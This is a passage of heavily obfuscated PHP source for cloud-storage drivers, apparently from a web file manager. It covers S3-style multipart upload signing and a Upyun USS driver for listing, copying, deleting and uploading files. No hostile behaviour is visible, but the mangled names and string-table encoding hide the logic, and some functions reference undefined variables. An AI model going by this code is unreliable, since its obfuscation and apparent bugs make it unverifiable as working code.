$èßşèÂ­ = hash_hmac($Ãùı—Ÿ›[1332], $•€šÚËÌ, $Ãùı—Ÿ›[1333] . $this->secret, !0); $Õ÷ğƒ’ = hash_hmac($Ãùı—Ÿ›[1332], $this->region, $èßşèÂ­, !0); $”úà–Ÿ = hash_hmac($Ãùı—Ÿ›[1332], $‰È²¹–ß, $Õ÷ğƒ’, !0); $ğÀ¥™† = hash_hmac($Ãùı—Ÿ›[1332], $‘Ü’›¤´, $”úà–Ÿ, !0); $—Ç•Õ›· = hash_hmac($Ãùı—Ÿ›[1332], $‰Ğ©…µ‹, $ğÀ¥™†); $€éÚ’¾ = array($Ãùı—Ÿ›[210] => $Ãùı—Ÿ›[12], $Ãùı—Ÿ›[1334] => $Ãùı—Ÿ›[12], $Ãùı—Ÿ›[1288] => $€“­¦è³, $Ãùı—Ÿ›[1292] => $”ù¸¥¯â, $Ãùı—Ÿ›[1296] => $‰Ğ©…µ‹, $Ãùı—Ÿ›[1335] => $úÑêš±ò, $Ãùı—Ÿ›[1336] => $¥È÷Ğ‰Ú, $Ãùı—Ÿ›[1337] => $‘ìò™˜¨, $Ãùı—Ÿ›[1338] => $Âïäç¸, $Ãùı—Ÿ›[1339] => $—Ç•Õ›·, $Ãùı—Ÿ›[174] => $this->getHost()); return $€éÚ’¾; } public function multiUploadFormData($´âóÄÀ½, $Ê¿÷şö¾ = 3600) { $ßÇîŞİÊ =& $_SERVER[ì…™Î¶Ï]; $Ÿ«äìà¹ = gmdate($ßÇîŞİÊ[1419]); $œ¼Â¹š× = array(); $ıÆŸş¶Ë = $this->client->getUploadId($this->bucket, $´âóÄÀ½, $œ¼Â¹š×); if (!$ıÆŸş¶Ë) { return !1; } return array($ßÇîŞİÊ[218] => $ıÆŸş¶Ë, $ßÇîŞİÊ[174] => $this->getHost() . $ßÇîŞİÊ[8] . $this->pathEncode($´âóÄÀ½), $ßÇîŞİÊ[219] => $Ÿ«äìà¹, $ßÇîŞİÊ[95] => $´âóÄÀ½); } public function multiUploadAuthData($šåçƒ´õ, $é±¯£ = array()) { $„íõ®µß =& $_SERVER[ì…™Î¶Ï]; $Ñâñ¡öç = isset($é±¯£[$„íõ®µß[167]]) ? $é±¯£[$„íõ®µß[167]] : $„íõ®µß[12]; $Œ±«Ú©æ = $é±¯£[$„íõ®µß[95]]; unset($é±¯£[$„íõ®µß[95]]); if (isset($é±¯£[$„íõ®µß[220]])) { return $this->listUploadParts($Œ±«Ú©æ, $é±¯£); } $É´ş°•Ñ = array(); if (isset($é±¯£[$„íõ®µß[1420]])) { $É´ş°•Ñ[$„íõ®µß[1421]] = $é±¯£[$„íõ®µß[1420]]; } $äÍç˜Œö = explode($„íõ®µß[176], $this->getHost()); $ÌüºìÒ² = array($„íõ®µß[1422] => $äÍç˜Œö[1], $„íõ®µß[1423] => $„íõ®µß[12], $„íõ®µß[210] => $„íõ®µß[118], $„íõ®µß[1334] => $é±¯£[$„íõ®µß[80]]); $‰Ëæ‘ØÖ = $„íõ®µß[223]; $’á¸Äòò = $„íõ®µß[8] . $this->pathEncode($Œ±«Ú©æ) . $Ñâñ¡öç; $­Ş´—²³ = $this->client->__getSignatureV4($É´ş°•Ñ, $ÌüºìÒ², $‰Ëæ‘ØÖ, $’á¸Äòò); if (strpos($Ñâñ¡öç, $„íõ®µß[222]) === 0) { if (isset($É´ş°•Ñ[$„íõ®µß[1421]])) { $çö×ïƒŸ = $É´ş°•Ñ[$„íõ®µß[1421]]; } else { if (isset($­Ş´—²³[$„íõ®µß[1421]])) { $çö×ïƒŸ = $­Ş´—²³[$„íõ®µß[1421]]; } else { $çö×ïƒŸ = hash($„íõ®µß[1332], $„íõ®µß[12]); } } return array($„íõ®µß[229] => $­Ş´—²³[$„íõ®µß[229]], $„íõ®µß[1421] => $çö×ïƒŸ, $„íõ®µß[219] => $­Ş´—²³[$„íõ®µß[1424]]); } return $­Ş´—²³[$„íõ®µß[229]]; } public function listUploadParts($®—§Øş„, $şú‘Ñ— = array()) { $†ÖÛŒôÅ =& $_SERVER[ì…™Î¶Ï]; $£€¥›¨£ = str_replace($†ÖÛŒôÅ[230], $†ÖÛŒôÅ[12], $şú‘Ñ—[$†ÖÛŒôÅ[167]]); $Áä´µË = $this->client->listParts($this->bucket, $®—§Øş„, $£€¥›¨£); if (!$Áä´µË) { return !1; } $ç¤äô­ò = $†ÖÛŒôÅ[1425]; foreach ($Áä´µË as $¡êøÔ) { $ç¤äô­ò .= $†ÖÛŒôÅ[1426] . "\74\x50\x61\x72\164\116\x75\155\142\145\x72\76{$¡êøÔ[$†ÖÛŒôÅ[1380]]}\x3c\57\120\141\162\x74\116\165\155\142\x65\162\76\12" . "\x3c\x45\x54\141\147\x3e{$¡êøÔ[$†ÖÛŒôÅ[1381]]}\74\x2f\x45\x54\141\147\x3e\12" . $†ÖÛŒôÅ[1427]; } $ç¤äô­ò .= $†ÖÛŒôÅ[1428]; $ÉøÒßöœ = array(); $Ãîß²êæ = explode($†ÖÛŒôÅ[176], $this->getHost()); $ğ—äù§ = array($†ÖÛŒôÅ[1422] => $Ãîß²êæ[1], $†ÖÛŒôÅ[210] => $†ÖÛŒôÅ[118], $†ÖÛŒôÅ[1334] => strlen($ç¤äô­ò)); $Âµ€ö¦í = $†ÖÛŒôÅ[221]; $ÂÒÒĞ¥ = $†ÖÛŒôÅ[8] . $this->pathEncode($®—§Øş„) . $şú‘Ñ—[$†ÖÛŒôÅ[167]]; $Ù·ÑÑáï = $this->client->__getSignatureV4($ÉøÒßöœ, $ğ—äù§, $Âµ€ö¦í, $ÂÒÒĞ¥, $ç¤äô­ò); return array($†ÖÛŒôÅ[229] => $Ù·ÑÑáï[$†ÖÛŒôÅ[229]], $†ÖÛŒôÅ[219] => $Ù·ÑÑáï[$†ÖÛŒôÅ[1424]], $†ÖÛŒôÅ[231] => $Áä´µË, $†ÖÛŒôÅ[1421] => $Ù·ÑÑáï[$†ÖÛŒôÅ[1421]]); } public function link($¹´Û™÷ã, $ÖşÈşäŒ = array()) { return parent::link($¹´Û™÷ã, $ÖşÈşäŒ); } public function fileOut($Í¨Ë¬®, $ñÌØ©ê = false, $ÁâÒ²Ç† = false, $—ˆ¦¦‹ß = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ì…™Î¶Ï][1429])) { return parent::fileOutServer($Í¨Ë¬®, $ñÌØ©ê, $ÁâÒ²Ç†, $—ˆ¦¦‹ß); } parent::fileOut($Í¨Ë¬®, $ñÌØ©ê, $ÁâÒ²Ç†, $—ˆ¦¦‹ß); } public function fileOutImage($’Óƒş€Â, $ÎÔ®ÌÙ = 250) { if (strstr($this->endpoint, $_SERVER[ì…™Î¶Ï][1429])) { return parent::fileOutImageServer($’Óƒş€Â, $ÎÔ®ÌÙ); } parent::fileOutImage($’Óƒş€Â, $ÎÔ®ÌÙ); } public function fileOutLink($æˆ‚¸íï) { $ÄâÃ°¼« =& $_SERVER[ì…™Î¶Ï]; if (substr($æˆ‚¸íï, 0, 7) == $ÄâÃ°¼«[1299]) { $æˆ‚¸íï = $ÄâÃ°¼«[1300] . substr($æˆ‚¸íï, 7); } header($ÄâÃ°¼«[158] . $æˆ‚¸íï); die; } public function getHost() { $½ØÊ¤Ô =& $_SERVER[ì…™Î¶Ï]; $îœÏ§¯› = str_rtrim(parent::getHost(), $½ØÊ¤Ô[8] . $this->bucket); $îœÏ§¯› = explode($½ØÊ¤Ô[176], $îœÏ§¯›); return $îœÏ§¯›[0] . $½ØÊ¤Ô[176] . $this->bucket . $½ØÊ¤Ô[10] . $îœÏ§¯›[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($–ÏóÁÙß, $ï«´„ë = 0) { parent::__construct(); $this->source = $–ÏóÁÙß; $this->sourceSize = $ï«´„ë; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($í²€‰ê‡ = false) { return $this->sourceSize; } public function getContent($å¯Ùí¡í = false) { return $this->fileSubstr($å¯Ùí¡í, 0, $this->sourceSize); } public function fileSubstr($’ÔÅû³† = false, $ùîË»¡Ø = 0, $¹¼»³ì² = 0) { if (!$¹¼»³ì²) { $¹¼»³ì² = $this->sourceSize; } $ŒÌÏõ¯ú = $this->sourceSize - $ùîË»¡Ø; if ($¹¼»³ì² >= $ŒÌÏõ¯ú) { $¹¼»³ì² = $ŒÌÏõ¯ú; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ùîË»¡Ø, $¹¼»³ì²); } if ($this->sourceType == self::TYPE_FILE) { if ($¹¼»³ì² <= 0) { return $_SERVER[ì…™Î¶Ï][12]; } $ùşë¯¦æ = ftell($this->source); fseek_64($this->source, $ùşë¯¦æ + $ùîË»¡Ø); $½ùÆ¸Ğ¬ = @fread($this->source, $¹¼»³ì²); fseek_64($this->source, $ùşë¯¦æ); return $½ùÆ¸Ğ¬; } } public function hashMd5($‹öÒ£æ = false) { return md5($this->getContent()); } public static function hash($Ï¶Û¼ûâ, $¿‚Á± = 0) { $ù…‰ñ” = new PathDriverStream($Ï¶Û¼ûâ, $¿‚Á±); return $ù…‰ñ”->hashSimple($Ï¶Û¼ûâ); } public static function md5($Ñî©‚»ñ, $îîÛ“Š = 0) { $Šğ´ÊÛ² = new PathDriverStream($Ñî©‚»ñ, $îîÛ“Š); return $Šğ´ÊÛ²->hashMd5($Ñî©‚»ñ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\160\x3a\x2f\x2f\166\x30\x2e\141\x70\x69\56\x75\x70\x79\165\x6e\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¾¼àôæ”) { parent::__construct(); $this->_init($¾¼àôæ”); } public function _init($›–¦ÓŒ„) { $Š°œˆ’ê =& $_SERVER[ì…™Î¶Ï]; foreach ($›–¦ÓŒ„ as $ŠáÉ°¡† => $İ×ï´í) { if (isset($this->{$ŠáÉ°¡†})) { $this->{$ŠáÉ°¡†} = $İ×ï´í; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Š°œˆ’ê[1430] . LNG($Š°œˆ’ê[1361])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($û‚é¡Œ, $Ñûé©æÒ = "\x47\105\124") { $’êÚñš© =& $_SERVER[ì…™Î¶Ï]; $ß‡›°ó = gmdate($’êÚñš©[1394]); $ûäƒÏ©Ô = base64_encode(hash_hmac($’êÚñš©[1431], "{$Ñûé©æÒ}\46{$û‚é¡Œ}\x26{$ß‡›°ó}", md5("{$this->userpass}"), !0)); $Ê„ÃŠ¸õ = array("\x41\165\164\150\x6f\x72\151\172\141\164\151\157\x6e\x3a\125\x50\x59\x55\116\x20{$this->username}\72{$ûäƒÏ©Ô}", "\104\141\164\x65\x3a{$ß‡›°ó}"); return $Ê„ÃŠ¸õ; } public function ussRequest($èœøˆŒ¹, $–…àìÁº = "\x47\x45\x54", $¹Œ É²  = false, $‚øùçù = false, $Œı•ñ¸ = false) { $ß›ÔÙ¦ƒ =& $_SERVER[ì…™Î¶Ï]; $èœøˆŒ¹ = trim($èœøˆŒ¹, $ß›ÔÙ¦ƒ[8]); $Ÿ³ÕöÎ÷ = "\57{$this->bucket}\x2f{$èœøˆŒ¹}"; $œğ»à…Ó = $this->ussHeaders($Ÿ³ÕöÎ÷, $–…àìÁº); if ($‚øùçù) { $œğ»à…Ó = array_merge($œğ»à…Ó, $‚øùçù); } $½û÷›®– = url_request($this->endpoint . $Ÿ³ÕöÎ÷, $–…àìÁº, $¹Œ É² , $œğ»à…Ó, $Œı•ñ¸); if (!$½û÷›®–) { return array($ß›ÔÙ¦ƒ[1165] => !1, $ß›ÔÙ¦ƒ[1167] => $ß›ÔÙ¦ƒ[1432]); } if (strtolower($–…àìÁº) == $ß›ÔÙ¦ƒ[189] || in_array($½û÷›®–[$ß›ÔÙ¦ƒ[1165]], array($ß›ÔÙ¦ƒ[1284], $ß›ÔÙ¦ƒ[1433]))) { $¹Œ É²  = $½û÷›®–[$ß›ÔÙ¦ƒ[1434]]; } else { $¹Œ É²  = json_decode($½û÷›®–[$ß›ÔÙ¦ƒ[1167]], !0); if (!$¹Œ É² ) { $¹Œ É²  = $½û÷›®–[$ß›ÔÙ¦ƒ[1167]]; } else { if (!$½û÷›®–[$ß›ÔÙ¦ƒ[725]] && isset($¹Œ É² [$ß›ÔÙ¦ƒ[1435]])) { $¹Œ É²  = $¹Œ É² [$ß›ÔÙ¦ƒ[1435]]; } } } return array($ß›ÔÙ¦ƒ[1165] => $½û÷›®–[$ß›ÔÙ¦ƒ[725]], $ß›ÔÙ¦ƒ[1167] => $¹Œ É² ); } public function mkfile($ü½´åÒâ, $ÑñıÕû¹ = '', $…Ä¡öÂ = REPEAT_RENAME) { if ($this->setContent($ü½´åÒâ, $ÑñıÕû¹)) { return $this->getPathOuter($ü½´åÒâ); } return !1; } public function mkdir($É—Àù´û, $«ùÂ¼ÔÁ = REPEAT_SKIP) { $œû•°î© =& $_SERVER[ì…™Î¶Ï]; $¶ù«´œ = trim($É—Àù´û, $œû•°î©[8]); if ($this->_isFolder($¶ù«´œ)) { return $this->getPathOuter($¶ù«´œ); } $‚•‡ˆ¹˜ = array($œû•°î©[1436]); $ø£…Ê‰’ = $this->ussRequest($¶ù«´œ, $œû•°î©[221], !1, $‚•‡ˆ¹˜); return $ø£…Ê‰’[$œû•°î©[1165]] ? $this->getPathOuter($¶ù«´œ) : !1; } public function copyFile($†ØÖµÄ, $§¿ôÜÕà) { $Şü÷Š˜ =& $_SERVER[ì…™Î¶Ï]; $¼‚ëØö = array($Şü÷Š˜[1437] . "\57{$this->bucket}\x2f{$†ØÖµÄ}", $Şü÷Š˜[1438]); $”èÚÛ€± = $this->ussRequest($§¿ôÜÕà, $Şü÷Š˜[223], !1, $¼‚ëØö); return $”èÚÛ€±[$Şü÷Š˜[1165]] ? !0 : $this->getPathOuter($§¿ôÜÕà); } public function moveFile($í„Òåûª, $Ì„ÔŞ½ö) { $ÅãìÛ˜ =& $_SERVER[ì…™Î¶Ï]; $İÍ°·ßì = array($ÅãìÛ˜[1439] . "\x2f{$this->bucket}\x2f{$í„Òåûª}", $ÅãìÛ˜[1438]); $€ßâ˜Ü« = $this->ussRequest($Ì„ÔŞ½ö, $ÅãìÛ˜[223], !1, $İÍ°·ßì); return $€ßâ˜Ü«[$ÅãìÛ˜[1165]] ? !0 : $this->getPathOuter($Ì„ÔŞ½ö); } public function delFile($½›ˆ¦Ù) { $º½»ÆÌô =& $_SERVER[ì…™Î¶Ï]; $Æ«Ìë® = $this->ussRequest($½›ˆ¦Ù, $º½»ÆÌô[1440]); return $Æ«Ìë®[$º½»ÆÌô[1165]] ? !0 : !1; } public function delFolder($Ï¯•µï‘) { $ìÕÅ‡ =& $_SERVER[ì…™Î¶Ï]; if (!$this->exist($Ï¯•µï‘)) { return !0; } $this->listItemCache = !1; $Ô¨ñ¢ó· = $¼Â«‰¤À = array(); $this->fileList($Ï¯•µï‘, $Ô¨ñ¢ó·, $¼Â«‰¤À, !0); $this->listItemCache = !0; foreach ($¼Â«‰¤À as $ú¬É¦ÜØ) { $ÎğÖÈƒ… = $this->ussRequest($ú¬É¦ÜØ[$ìÕÅ‡[32]], $ìÕÅ‡[1440]); if (!$ÎğÖÈƒ…[$ìÕÅ‡[1165]]) { return !1; } } foreach ($Ô¨ñ¢ó· as $ñæÙ˜’) { $ÎğÖÈƒ… = $this->ussRequest($ñæÙ˜’, $ìÕÅ‡[1440]); if (!$ÎğÖÈƒ…[$ìÕÅ‡[1165]]) { return !1; } } $ÎğÖÈƒ… = $this->ussRequest($Ï¯•µï‘, $ìÕÅ‡[1440]); return $ÎğÖÈƒ…[$ìÕÅ‡[1165]]; } public function rename($²×ˆŞ£õ, $ã‘œ½—®) { if ($this->isFile($²×ˆŞ£õ)) { $ã‘œ½—® = get_path_father($²×ˆŞ£õ) . $ã‘œ½—®; return $this->moveFile($²×ˆŞ£õ, $ã‘œ½—®); } return $this->renameObject($²×ˆŞ£õ, $ã‘œ½—®); } public function fileInfo($Ø€Åø’¤, $¾¶‹ï´é = false, $éıçŠâÕ = array()) { $æı‘ë®Š =& $_SERVER[ì…™Î¶Ï]; $À¤í¢à = array($æı‘ë®Š[32] => $this->pathThis($Ø€Åø’¤), $æı‘ë®Š[78] => $this->getPathOuter($æı‘ë®Š[8] . $Ø€Åø’¤), $æı‘ë®Š[33] => $æı‘ë®Š[192], $æı‘ë®Š[80] => isset($éıçŠâÕ[$æı‘ë®Š[80]]) ? $éıçŠâÕ[$æı‘ë®Š[80]] : 0, $æı‘ë®Š[167] => $this->ext($Ø€Åø’¤)); if ($¾¶‹ï´é) { return $À¤í¢à; } $À¤í¢à[$æı‘ë®Š[193]] = $À¤í¢à[$æı‘ë®Š[86]] = 0; $À¤í¢à[$æı‘ë®Š[194]] = $À¤í¢à[$æı‘ë®Š[195]] = !0; if (empty($éıçŠâÕ)) { $éıçŠâÕ = $this->objectMeta($Ø€Åø’¤); if (!$éıçŠâÕ) { return $À¤í¢à; } } $À¤í¢à[$æı‘ë®Š[193]] = intval($éıçŠâÕ[$æı‘ë®Š[1441]]); $À¤í¢à[$æı‘ë®Š[86]] = intval($éıçŠâÕ[$æı‘ë®Š[1442]]); $À¤í¢à[$æı‘ë®Š[80]] = $éıçŠâÕ[$æı‘ë®Š[80]]; return $À¤í¢à; } public function folderInfo($›å›ì‹©, $€Á´çˆ = false) { $¡ğ¿Á‘¶ =& $_SERVER[ì…™Î¶Ï]; $İ é˜– = array($¡ğ¿Á‘¶[32] => $this->pathThis($›å›ì‹©), $¡ğ¿Á‘¶[78] => $this->getPathOuter($¡ğ¿Á‘¶[8] . $›å›ì‹©), $¡ğ¿Á‘¶[33] => $¡ğ¿Á‘¶[79]); if ($€Á´çˆ) { return $İ é˜–; } $İ é˜–[$¡ğ¿Á‘¶[193]] = $İ é˜–[$¡ğ¿Á‘¶[86]] = 0; $İ é˜–[$¡ğ¿Á‘¶[194]] = $İ é˜–[$¡ğ¿Á‘¶[195]] = !0; if (empty($˜¥ñ ©é)) { $˜¥ñ ©é = $this->objectMeta($›å›ì‹©); if (!$˜¥ñ ©é) { return $İ é˜–; } } $İ é˜–[$¡ğ¿Á‘¶[193]] = intval($˜¥ñ ©é[$¡ğ¿Á‘¶[1441]]); $İ é˜–[$¡ğ¿Á‘¶[86]] = intval($˜¥ñ ©é[$¡ğ¿Á‘¶[1442]]); return $İ é˜–; } private function listObjs($ıÈÔ×´Ã, $„ôÜÀ€è = 0, $üƒíßíÑ = 1000) { $¶“Œ²ÅÂ =& $_SERVER[ì…™Î¶Ï]; $‰‹«ıüş = array($¶“Œ²ÅÂ[1443], $¶“Œ²ÅÂ[1444] . $üƒíßíÑ); if ($„ôÜÀ€è) { $‰‹«ıüş[] = $¶“Œ²ÅÂ[1445] . $„ôÜÀ€è; } $§å¿Ã›Ö = $this->ussRequest($ıÈÔ×´Ã, $¶“Œ²ÅÂ[225], !1, $‰‹«ıüş); return !$§å¿Ã›Ö[$¶“Œ²ÅÂ[1165]] ? !1 : $§å¿Ã›Ö[$¶“Œ²ÅÂ[1167]]; } private function fileList($ùûœŞãÚ, &$Åƒ†•Íæ, &$ı…şšóÊ, $¯£ÄÄºö = false) { $œåİ³‘Û =& $_SERVER[ì…™Î¶Ï]; $œ©¬€ÔÔ = $œåİ³‘Û[12]; $¼÷¥¬Ìñ = 1000; $·Ø½ˆßÒ = rtrim($ùûœŞãÚ, $œåİ³‘Û[8]) . $œåİ³‘Û[8]; $ÆÌÅÔ¡ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $˜ÄíÜµÊ = $this->listObjs($ùûœŞãÚ, $œ©¬€ÔÔ, $¼÷¥¬Ìñ); if (!$˜ÄíÜµÊ) { return !1; } $œ©¬€ÔÔ = isset($˜ÄíÜµÊ[$œåİ³‘Û[1446]]) ? $˜ÄíÜµÊ[$œåİ³‘Û[1446]] : $œåİ³‘Û[12]; $Š°‘ù›İ = isset($˜ÄíÜµÊ[$œåİ³‘Û[1447]]) ? $˜ÄíÜµÊ[$œåİ³‘Û[1447]] : array(); foreach ($Š°‘ù›İ as $­¶ÁĞù‹) { $ôêÛ–¤ = $­¶ÁĞù‹[$œåİ³‘Û[33]] == $œåİ³‘Û[79] ? !0 : !1; $¬é’úÇ = ltrim($·Ø½ˆßÒ . $­¶ÁĞù‹[$œåİ³‘Û[32]], $œåİ³‘Û[8]) . ($ôêÛ–¤ ? $œåİ³‘Û[8] : $œåİ³‘Û[12]); $à¼³—–Ó = array($œåİ³‘Û[32] => $¬é’úÇ, $œåİ³‘Û[33] => $ôêÛ–¤ ? $œåİ³‘Û[79] : $œåİ³‘Û[192], $œåİ³‘Û[80] => $­¶ÁĞù‹[$œåİ³‘Û[332]], $œåİ³‘Û[1442] => $­¶ÁĞù‹[$œåİ³‘Û[1448]]); if ($ÆÌÅÔ¡) { $this->cacheMethod($œåİ³‘Û[198], $¬é’úÇ, $ôêÛ–¤); $this->cacheMethod($œåİ³‘Û[199], $¬é’úÇ, $à¼³—–Ó); } if ($ôêÛ–¤) { $Åƒ†•Íæ[] = $¬é’úÇ; if ($¯£ÄÄºö) { $this->fileList($¬é’úÇ, $Åƒ†•Íæ, $ı…şšóÊ, $¯£ÄÄºö); } continue; } $ı…şšóÊ[] = $à¼³—–Ó; } if (count($Š°‘ù›İ) < $¼÷¥¬Ìñ) { break; } } if ($ÆÌÅÔ¡) { $this->cacheMethod($œåİ³‘Û[198], $ùûœŞãÚ, !0); } } public function listPath($ç¸Î½É”, $±øì»ú© = false) { $ ’‰±¶ =& $_SERVER[ì…™Î¶Ï]; $×¸öıÇÍ = $é½”ä©Ò = array(); $this->fileList($ç¸Î½É”, $×¸öıÇÍ, $é½”ä©Ò); foreach ($×¸öıÇÍ as $È³ú´–€ => $„ºá…¢ş) { $×¸öıÇÍ[$È³ú´–€] = $this->folderInfo($„ºá…¢ş, $±øì»ú©); } foreach ($é½”ä©Ò as $È³ú´–€ => $„ºá…¢ş) { $é½”ä©Ò[$È³ú´–€] = $this->fileInfo($„ºá…¢ş[$ ’‰±¶[32]], $±øì»ú©, $„ºá…¢ş); } return array($ ’‰±¶[77] => $×¸öıÇÍ, $ ’‰±¶[76] => $é½”ä©Ò); } public function has($É²Ü”Â, $ÅÇ€£ºÍ = false, $éª“ÏŒç = true) { $´½¸ƒšÈ =& $_SERVER[ì…™Î¶Ï]; $­Á«ã¾ı = $´½¸ƒšÈ[12]; $Ä—ªˆ­Õ = 500; $å¨›¬ì¿ = 0; $öšéû¦¿ = 0; $Í»ÚÁÁ™ = rtrim($É²Ü”Â, $´½¸ƒšÈ[8]) . $´½¸ƒšÈ[8]; while (!0) { check_abort(); $øïß¬é¿ = $this->listObjs($É²Ü”Â, $­Á«ã¾ı, $Ä—ªˆ­Õ); if (!$øïß¬é¿) { return !1; } $­Á«ã¾ı = isset($øïß¬é¿[$´½¸ƒšÈ[1446]]) ? $øïß¬é¿[$´½¸ƒšÈ[1446]] : $´½¸ƒšÈ[12]; $®Ô×Ó¾ñ = isset($øïß¬é¿[$´½¸ƒšÈ[1447]]) ? $øïß¬é¿[$´½¸ƒšÈ[1447]] : array(); if (empty($®Ô×Ó¾ñ)) { break; } $åÑöèæ = array_filter($®Ô×Ó¾ñ, function ($Éª­©Ş©) { $·´âšœ =& $_SERVER[ì…™Î¶Ï]; return $Éª­©Ş©[$·´âšœ[33]] == $·´âšœ[79]; }); $ìŒ…òÇ¢ = count($®Ô×Ó¾ñ); $åÑöèæ = count($åÑöèæ); $¦¸ÏşÒ = $ìŒ…òÇ¢ - $åÑöèæ; if ($ÅÇ€£ºÍ) { $öšéû¦¿ += $åÑöèæ; $å¨›¬ì¿ += $¦¸ÏşÒ; if ($ìŒ…òÇ¢ < $Ä—ªˆ­Õ) { break; } continue; } if ($éª“ÏŒç) { if ($¦¸ÏşÒ) { return !0; } } else { if ($åÑöèæ) { return !0; } } if ($ìŒ…òÇ¢ < $Ä—ªˆ­Õ) { break; } } if ($ÅÇ€£ºÍ) { return array($´½¸ƒšÈ[202] => $å¨›¬ì¿, $´½¸ƒšÈ[203] => $öšéû¦¿); } return !1; } public function listAll($ÛÉÏ¸ÙÖ) { $Ôù™‹²‡ =& $_SERVER[ì…™Î¶Ï]; $µ¦ßÎûá = $ÎÌ—°Â = array(); $this->fileList($ÛÉÏ¸ÙÖ, $µ¦ßÎûá, $ÎÌ—°Â, !0); $òş«ö¬ç = array(); foreach ($ÎÌ—°Â as $İ’¾ã¡”) { $òş«ö¬ç[$İ’¾ã¡”[$Ôù™‹²‡[32]]] = $İ’¾ã¡”[$Ôù™‹²‡[80]]; } foreach ($µ¦ßÎûá as $İ’¾ã¡”) { if (is_string($İ’¾ã¡”)) { $òş«ö¬ç[$İ’¾ã¡”] = 0; } } return $this->listAllFiles($ÛÉÏ¸ÙÖ, array_keys($òş«ö¬ç), $òş«ö¬ç); } public function canRead($µ­º›õÔ) { return $this->exist($µ­º›õÔ) ? !0 : !1; } public function canWrite($½¶ãÛéÊ) { return $this->exist($½¶ãÛéÊ) ? !0 : !1; } public function getContent($êòŒ¦Ë) { return $this->fileSubstr($êòŒ¦Ë, 0, -1); } public function setContent($‡˜’¸ƒ£, $»å¯˜„Ï = '') { $…“€çØĞ =& $_SERVER[ì…™Î¶Ï]; if (!$»å¯˜„Ï) { $ÎÒ¯‡êó = $this->ussRequest($‡˜’¸ƒ£, $…“€çØĞ[221]); return $ÎÒ¯‡êó[$…“€çØĞ[1165]]; } $è“³¬ª³ = $this->tempFile($this->pathThis($‡˜’¸ƒ£)); file_put_contents($è“³¬ª³, $»å¯˜„Ï); if ($this->upload($‡˜’¸ƒ£, $è“³¬ª³)) { $this->tempFileRemve($è“³¬ª³); return !0; } return !1; } public function fileSubstr($ó¦õœÈŠ, $ê¦¿ô±, $ßºĞ—€Š) { $è¶÷Şºğ =& $_SERVER[ì…™Î¶Ï]; if (!($“ÓÒíÉš = $this->link($ó¦õœÈŠ))) { return !1; } $ë‰ğ¬á = !1; if ($ßºĞ—€Š > 0) { $ŒˆÆ‡ñì = $ê¦¿ô± + $ßºĞ—€Š - 1; $ë‰ğ¬á = array($è¶÷Şºğ[1409] . $ê¦¿ô± . $è¶÷Şºğ[451] . $ŒˆÆ‡ñì); } $ş¬îçÙ = url_request($“ÓÒíÉš, $è¶÷Şºğ[225], !1, $ë‰ğ¬á); return $ş¬îçÙ[$è¶÷Şºğ[725]] ? $ş¬îçÙ[$è¶÷Şºğ[1167]] : !1; } public function upload($ï£ê Î©, $Úùë®Î‰, $šÁÌ‡İì = false, $×Î£¹„Ò = REPEAT_REPLACE) { $—ŸÂÁë =& $_SERVER[ì…™Î¶Ï]; $ƒ¬€îå­ = IO::size($Úùë®Î‰); if ($ƒ¬€îå­ <= 1024 * 1024 * 200) { $°¥†…›° = array($—ŸÂÁë[1449] . $Úùë®Î‰); $µÑØ‡Ñ = $this->ussRequest($ï£ê Î©, $—ŸÂÁë[223], $°¥†…›°); return $µÑØ‡Ñ[$—ŸÂÁë[1165]] ? $this->getPathOuter($ï£ê Î©) : !1; } $¸Ïã¼Ûñ = 1024 * 1024 * 10; $ó–ÈÒ®Œ = array($—ŸÂÁë[1450], $—ŸÂÁë[1451] . $ƒ¬€îå­, $—ŸÂÁë[1452], $—ŸÂÁë[1453] . $¸Ïã¼Ûñ); $µÑØ‡Ñ = $this->ussRequest($ï£ê Î©, $—ŸÂÁë[223], !1, $ó–ÈÒ®Œ); if (!$µÑØ‡Ñ[$—ŸÂÁë[1165]]) { return !1; } $ùóœüªÍ = $µÑØ‡Ñ[$—ŸÂÁë[1167]]; $µÍ¹Õ¨¹ = 0; $¿Øıúä = $ùóœüªÍ[$—ŸÂÁë[1454]]; $–³Åúæ½ = fopen($Úùë®Î‰, $—ŸÂÁë[1358]); if (!$–³Åúæ½) { return !1; } do { $Ù¹½Ğ˜í = $ùóœüªÍ[$—ŸÂÁë[1455]]; fseek_64($–³Åúæ½, $µÍ¹Õ¨¹); $áş¥”† = fread($–³Åúæ½, $Ù¹½Ğ˜í); $×¢“ğ = 0; do { $×¢“ğ++; $ùóœüªÍ = $this->uploadPart($ï£ê Î©, $ùóœüªÍ, $áş¥”†); } while (!$ùóœüªÍ && $×¢“ğ < 3); if (!$ùóœüªÍ) { return !1; } $¿Øıúä = $ùóœüªÍ[$—ŸÂÁë[1454]]; $µÍ¹Õ¨¹ += $Ù¹½Ğ˜í; } while ($¿Øıúä != -1); fclose($–³Åúæ½); $ó–ÈÒ®Œ = array($—ŸÂÁë[1456], $—ŸÂÁë[1457] . $ùóœüªÍ[$—ŸÂÁë[1458]], $—ŸÂÁë[1452]); $µÑØ‡Ñ = $this->ussRequest($ï£ê Î©, $—ŸÂÁë[223], !1, $ó–ÈÒ®Œ); return $µÑØ‡Ñ[$—ŸÂÁë[1165]] ? $this->getPathOuter($‚®òµ‚×) : !1; } private function uploadPart($øÏéŠªÚ, $Šı™ì”, &$¾Ç¾ÇŒ©) { $Æ›’ŒÉ£ =& $_SERVER[ì…™Î¶Ï]; $×µûÍ´ = array($Æ›’ŒÉ£[1459], $Æ›’ŒÉ£[1457] . $Šı™ì”[$Æ›’ŒÉ£[1458]], $Æ›’ŒÉ£[1460] . $Šı™ì”[$Æ›’ŒÉ£[1454]], $Æ›’ŒÉ£[139] . 